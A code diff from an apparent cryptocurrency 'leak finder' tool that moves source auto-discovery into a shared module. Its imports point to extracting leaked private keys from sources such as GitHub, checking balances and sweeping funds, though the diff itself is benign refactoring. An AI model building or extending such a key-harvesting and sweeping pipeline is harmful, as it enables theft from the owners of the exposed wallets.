@@ -2,10 +2,8 @@
 from __future__ import annotations
 import asyncio
 import hashlib
-import importlib
 import logging
 import os
-import pathlib
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from typing import Optional
@@ -15,8 +13,9 @@ from src.modules.crypto.balance.hit_logger import HitLogger
 from src.modules.crypto.balance.multicall import batch_check_balances, batch_check_sol_balances
 from src.modules.crypto.balance.sweeper import Sweeper, SweepResult
 from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
-from src.modules.crypto.leak_finder.extractor import ExtractedKey, extract_keys
-from src.modules.crypto.leak_finder.sources.github_source import RawLeak
+from src.modules.crypto.leak_finder.extractor import ExtractedKey, KeyType, extract_keys
+from src.modules.sources.base import RawLeak
+from src.modules.sources import discover_sources
 
 logger = logging.getLogger(__name__)
 
@@ -36,40 +35,7 @@ class LeakFinderResult:
         return (self.completed_at - self.started_at).total_seconds() if self.completed_at else 0.0
 
 
-def _discover_sources() -> dict[str, type]:
-    """Auto-discover source classes from the sources directory.
-
-    Scans for *_source.py files, imports each module, and finds the class
-    that ends with 'Source'. This way adding a new source = just dropping
-    a file in sources/ — no coordinator modification needed.
-    """
-    source_map: dict[str, type] = {}
-    sources_dir = pathlib.Path(__file__).parent / "sources"
-    for py_file in sorted(sources_dir.glob("*_source.py")):
-        module_name = py_file.stem  # e.g. "github_source"
-        # Derive the source key: "github_source" -> "github"
-        key = module_name.replace("_source", "")
-        try:
-            module = importlib.import_module(
-                f"src.modules.crypto.leak_finder.sources.{module_name}"
-            )
-            # Find the class ending with "Source"
-            for attr_name in dir(module):
-                attr = getattr(module, attr_name)
-                if (
-                    isinstance(attr, type)
-                    and attr_name.endswith("Source")
-                    and attr_name != "RawLeak"
-                    and hasattr(attr, "fetch_raw_leaks")
-                ):
-                    source_map[key] = attr
-                    break
-        except Exception as exc:
-            logger.debug("Failed to auto-discover source %s: %s", module_name, exc)
-    return source_map
-
-
-_SOURCE_MAP = _discover_sources()
+_SOURCE_MAP = discover_sources()
 ALL_SOURCES = list(_SOURCE_MAP.keys())
 
 class LeakFinderCoordinator:
